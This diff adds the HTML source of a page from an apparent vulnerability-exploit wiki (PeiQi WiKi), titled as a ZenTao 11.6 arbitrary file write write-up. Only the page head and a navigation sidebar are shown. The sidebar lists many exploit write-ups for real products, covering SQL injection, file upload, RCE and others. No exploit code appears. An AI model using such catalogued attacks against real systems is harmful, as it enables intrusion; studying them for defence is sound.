@@ -1,0 +1,2994 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>禅道 11.6版本 任意文件写入漏洞 · PeiQi WiKi文库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="PeiQi">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-accordion/accordion.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-emphasize/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="禅道 11.6版本 任意文件读取漏洞.html" />
+    
+    
+    <link rel="prev" href="禅道 11.6版本 SQL注入漏洞.html" />
+    
+
+    
+    
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    Node Modules
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../../node_modules/boolbase/README.md">
+            
+                <span>
+            
+                    
+                    Boolbase
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../../node_modules/cheerio/Readme.md">
+            
+                <span>
+            
+                    
+                    Cheerio
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../../node_modules/cheerio/History.md">
+            
+                <span>
+            
+                    
+                    History
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../../node_modules/cheerio-select-tmp/README.md">
+            
+                <span>
+            
+                    
+                    Cheerio Select Tmp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../../node_modules/css-select/README.md">
+            
+                <span>
+            
+                    
+                    Css Select
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../../node_modules/css-what/readme.md">
+            
+                <span>
+            
+                    
+                    Css What
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../../../node_modules/dom-serializer/README.md">
+            
+                <span>
+            
+                    
+                    Dom Serializer
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../../../node_modules/domelementtype/readme.md">
+            
+                <span>
+            
+                    
+                    Domelementtype
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../../../node_modules/domhandler/README.md">
+            
+                <span>
+            
+                    
+                    Domhandler
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../../../node_modules/domutils/readme.md">
+            
+                <span>
+            
+                    
+                    Domutils
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../../../node_modules/entities/readme.md">
+            
+                <span>
+            
+                    
+                    Entities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../../../node_modules/gitbook-plugin-accordion/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Accordion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../../../node_modules/gitbook-plugin-alerts/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Alerts
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../../../node_modules/gitbook-plugin-back-to-top-button/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Back To Top Button
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../../../node_modules/gitbook-plugin-chapter-fold/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Chapter Fold
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../../../node_modules/gitbook-plugin-code/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../../../node_modules/gitbook-plugin-emphasize/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Emphasize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../../../node_modules/gitbook-plugin-expandable-chapters/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Expandable Chapters
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../../../node_modules/gitbook-plugin-favicon/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Favicon
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.18.1" data-path="../../../node_modules/gitbook-plugin-favicon/CHANGELOG.md">
+            
+                <span>
+            
+                    
+                    CHANGELOG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../../../node_modules/gitbook-plugin-flexible-alerts/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Flexible Alerts
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.20" data-path="../../../node_modules/gitbook-plugin-github/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Github
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.21" data-path="../../../node_modules/gitbook-plugin-lightbox/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Lightbox
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.22" data-path="../../../node_modules/gitbook-plugin-pageview-count/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Pageview Count
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.23" data-path="../../../node_modules/gitbook-plugin-search-pro/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Search Pro
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.24" data-path="../../../node_modules/gitbook-plugin-sharing-plus/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Sharing Plus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.25" data-path="../../../node_modules/gitbook-plugin-splitter/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Splitter
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.26" data-path="../../../node_modules/gitbook-plugin-tbfed-pagefooter/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Tbfed Pagefooter
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.27" data-path="../../../node_modules/gitbook-plugin-theme-comscore/README.md">
+            
+                <span>
+            
+                    
+                    Gitbook Plugin Theme Comscore
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.28" data-path="../../../node_modules/html-entities/README.md">
+            
+                <span>
+            
+                    
+                    Html Entities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.29" data-path="../../../node_modules/htmlparser2/README.md">
+            
+                <span>
+            
+                    
+                    Htmlparser 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.30" data-path="../../../node_modules/lodash/README.md">
+            
+                <span>
+            
+                    
+                    Lodash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.31" data-path="../../../node_modules/moment/README.md">
+            
+                <span>
+            
+                    
+                    Moment
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.31.1" data-path="../../../node_modules/moment/CHANGELOG.md">
+            
+                <span>
+            
+                    
+                    CHANGELOG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.32" data-path="../../../node_modules/nth-check/README.md">
+            
+                <span>
+            
+                    
+                    Nth Check
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.33" data-path="../../../node_modules/parse5/README.md">
+            
+                <span>
+            
+                    
+                    Parse 5
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.34" data-path="../../../node_modules/parse5-htmlparser2-tree-adapter/README.md">
+            
+                <span>
+            
+                    
+                    Parse 5 Htmlparser 2 Tree Adapter
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.35" data-path="../../../node_modules/uuid/README.md">
+            
+                <span>
+            
+                    
+                    Uuid
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.35.1" data-path="../../../node_modules/uuid/CHANGELOG.md">
+            
+                <span>
+            
+                    
+                    CHANGELOG
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.35.2" data-path="../../../node_modules/uuid/LICENSE.md">
+            
+                <span>
+            
+                    
+                    LICENSE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    Pei Qi Wiki
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    CMS漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../Discuz!X/">
+            
+                <a href="../Discuz!X/">
+            
+                    
+                    Discuz X
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.1" data-path="../Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html">
+            
+                <a href="../Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html">
+            
+                    
+                    Discuz!X 小于3.4 R20191201 后台SQL注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../Typesetter/">
+            
+                <a href="../Typesetter/">
+            
+                    
+                    Typesetter
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.2.1" data-path="../Typesetter/Typesetter CMS 5-5.1 任意文件上传.html">
+            
+                <a href="../Typesetter/Typesetter CMS 5-5.1 任意文件上传.html">
+            
+                    
+                    Typesetter CMS 5-5.1 任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="../Weiphp/">
+            
+                <a href="../Weiphp/">
+            
+                    
+                    Weiphp
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.3.1" data-path="../Weiphp/Weiphp5.0 任意用户Cookie伪造.html">
+            
+                <a href="../Weiphp/Weiphp5.0 任意用户Cookie伪造.html">
+            
+                    
+                    Weiphp5.0 任意用户Cookie伪造
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3.2" data-path="../Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html">
+            
+                <a href="../Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html">
+            
+                    
+                    Weiphp5.0 前台文件任意读取 CNVD-2020-68596
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.4" data-path="../YzmCMS/">
+            
+                <a href="../YzmCMS/">
+            
+                    
+                    Yzm CMS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.4.1" data-path="../YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html">
+            
+                <a href="../YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html">
+            
+                    
+                    YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.5" data-path="../华宜互联CMS/">
+            
+                <a href="../华宜互联CMS/">
+            
+                    
+                    华宜互联CMS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.5.1" data-path="../华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html">
+            
+                <a href="../华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html">
+            
+                    
+                    华宜互联CMS默认存在超级管理员漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.6" data-path="../极致CMS/">
+            
+                <a href="../极致CMS/">
+            
+                    
+                    极致CMS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.6.1" data-path="../极致CMS/极致CMS 1.81以下版本 存储型XSS.html">
+            
+                <a href="../极致CMS/极致CMS 1.81以下版本 存储型XSS.html">
+            
+                    
+                    极致CMS 1.81以下版本 存储型XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.6.2" data-path="../极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html">
+            
+                <a href="../极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html">
+            
+                    
+                    极致CMS_1.71_1.7_1.67版本sql注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.6.3" data-path="../极致CMS/极致CMS_全版本任意文件上传.html">
+            
+                <a href="../极致CMS/极致CMS_全版本任意文件上传.html">
+            
+                    
+                    极致CMS_全版本任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    禅道CMS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.7.1" data-path="禅道 11.6版本 SQL注入漏洞.html">
+            
+                <a href="禅道 11.6版本 SQL注入漏洞.html">
+            
+                    
+                    禅道 11.6版本 SQL注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.1.7.2" data-path="禅道 11.6版本 任意文件写入漏洞.html">
+            
+                <a href="禅道 11.6版本 任意文件写入漏洞.html">
+            
+                    
+                    禅道 11.6版本 任意文件写入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7.3" data-path="禅道 11.6版本 任意文件读取漏洞.html">
+            
+                <a href="禅道 11.6版本 任意文件读取漏洞.html">
+            
+                    
+                    禅道 11.6版本 任意文件读取漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7.4" data-path="禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html">
+            
+                <a href="禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html">
+            
+                    
+                    禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7.5" data-path="禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html">
+            
+                <a href="禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html">
+            
+                    
+                    禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../OA产品漏洞/">
+            
+                <a href="../../OA产品漏洞/">
+            
+                    
+                    OA产品漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../../OA产品漏洞/泛微OA/">
+            
+                <a href="../../OA产品漏洞/泛微OA/">
+            
+                    
+                    泛微OA
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1.1" data-path="../../OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html">
+            
+                <a href="../../OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html">
+            
+                    
+                    泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.1.2" data-path="../../OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.html">
+            
+                <a href="../../OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.html">
+            
+                    
+                    泛微OA e-cology 数据库配置信息泄漏漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.1.3" data-path="../../OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html">
+            
+                <a href="../../OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html">
+            
+                    
+                    泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.1.4" data-path="../../OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html">
+            
+                <a href="../../OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html">
+            
+                    
+                    泛微OA WorkflowCenterTreeData接口SQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.1.5" data-path="../../OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html">
+            
+                <a href="../../OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html">
+            
+                    
+                    泛微云桥 e-Bridge 任意文件读取
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../../OA产品漏洞/用友OA/">
+            
+                <a href="../../OA产品漏洞/用友OA/">
+            
+                    
+                    用友OA
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.2.1" data-path="../../OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html">
+            
+                <a href="../../OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html">
+            
+                    
+                    用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" data-path="../../OA产品漏洞/致远OA/">
+            
+                <a href="../../OA产品漏洞/致远OA/">
+            
+                    
+                    致远OA
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.3.1" data-path="../../OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html">
+            
+                <a href="../../OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html">
+            
+                    
+                    致远OA A8 htmlofficeservlet RCE漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3.2" data-path="../../OA产品漏洞/致远OA/致远OA ajax.do登录绕过 任意文件上传.html">
+            
+                <a href="../../OA产品漏洞/致远OA/致远OA ajax.do登录绕过 任意文件上传.html">
+            
+                    
+                    致远OA ajax.do登录绕过 任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3.3" data-path="../../OA产品漏洞/致远OA/致远OA Session泄漏漏洞.html">
+            
+                <a href="../../OA产品漏洞/致远OA/致远OA Session泄漏漏洞.html">
+            
+                    
+                    致远OA Session泄漏漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="../../OA产品漏洞/通达OA/">
+            
+                <a href="../../OA产品漏洞/通达OA/">
+            
+                    
+                    通达OA
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.4.1" data-path="../../OA产品漏洞/通达OA/通达OA v11.2后台任意文件上传漏洞.html">
+            
+                <a href="../../OA产品漏洞/通达OA/通达OA v11.2后台任意文件上传漏洞.html">
+            
+                    
+                    通达OA v11.2后台任意文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4.2" data-path="../../OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html">
+            
+                <a href="../../OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html">
+            
+                    
+                    通达OA v11.6 任意文件删除&RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4.3" data-path="../../OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.html">
+            
+                <a href="../../OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.html">
+            
+                    
+                    通达OA v11.7后台SQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4.4" data-path="../../OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html">
+            
+                <a href="../../OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html">
+            
+                    
+                    通达OA v11.x-v11.5任意用户登录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4.5" data-path="../../OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html">
+            
+                <a href="../../OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html">
+            
+                    
+                    通达OA部分漏洞信息整合
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../Web应用漏洞/">
+            
+                <a href="../../Web应用漏洞/">
+            
+                    
+                    Web应用漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" data-path="../../Web应用漏洞/Citrix XenMobile/">
+            
+                <a href="../../Web应用漏洞/Citrix XenMobile/">
+            
+                    
+                    Citrix Xen Mobile
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1.1" data-path="../../Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html">
+            
+                <a href="../../Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html">
+            
+                    
+                    Citrix XenMobile 任意文件读取 CVE-2020-8209
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" data-path="../../Web应用漏洞/F5 BIG-IP/Readme.html">
+            
+                <a href="../../Web应用漏洞/F5 BIG-IP/Readme.html">
+            
+                    
+                    F 5 BIG IP
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.2.1" data-path="../../Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html">
+            
+                <a href="../../Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html">
+            
+                    
+                    F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.3" data-path="../../Web应用漏洞/Lanproxy/Readme.html">
+            
+                <a href="../../Web应用漏洞/Lanproxy/Readme.html">
+            
+                    
+                    Lanproxy
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.3.1" data-path="../../Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html">
+            
+                <a href="../../Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html">
+            
+                    
+                    Lanproxy 目录遍历漏洞 CVE-2021-3019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.4" data-path="../../Web应用漏洞/Seo-Panel/">
+            
+                <a href="../../Web应用漏洞/Seo-Panel/">
+            
+                    
+                    Seo Panel
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.4.1" data-path="../../Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html">
+            
+                <a href="../../Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html">
+            
+                    
+                    Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.5" data-path="../../Web应用漏洞/宝塔运维管理面板/">
+            
+                <a href="../../Web应用漏洞/宝塔运维管理面板/">
+            
+                    
+                    宝塔运维管理面板
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.5.1" data-path="../../Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html">
+            
+                <a href="../../Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html">
+            
+                    
+                    宝塔 phpmyadmin未授权访问漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../../Web服务器漏洞/">
+            
+                <a href="../../Web服务器漏洞/">
+            
+                    
+                    Web服务器漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1" data-path="../../Web服务器漏洞/Apache/">
+            
+                <a href="../../Web服务器漏洞/Apache/">
+            
+                    
+                    Apache
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.1" data-path="../../Web服务器漏洞/Apache/Apache Cocoon/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Cocoon/">
+            
+                    
+                    Apache Cocoon
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
